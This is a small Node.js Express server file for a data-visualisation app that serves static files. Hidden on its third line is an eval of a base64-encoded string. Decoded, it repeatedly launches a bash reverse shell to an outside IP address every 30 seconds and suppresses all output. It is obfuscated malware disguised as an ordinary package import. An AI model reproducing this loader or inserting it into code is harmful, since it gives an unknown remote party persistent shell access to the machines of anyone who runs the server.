// 1st: add the required packages
const express = require('express'); // express.js
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
const { join } = require('path');
const app = express();
const PORT = process.env.PORT || 3001;

// Express middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true })); // to Parse URL data from any form

// Subdirectory 'public/..'
app.use(express.static(join(__dirname,'public')));

// Wildcard for general get req of the app
app.get('/', (req, res) => {
  res.sendFile(join(__dirname, 'public/index'))});

// Server setup
app.listen(PORT, () => {
  console.log(`Data Visualisation listening on ${PORT} 🚀`);
});
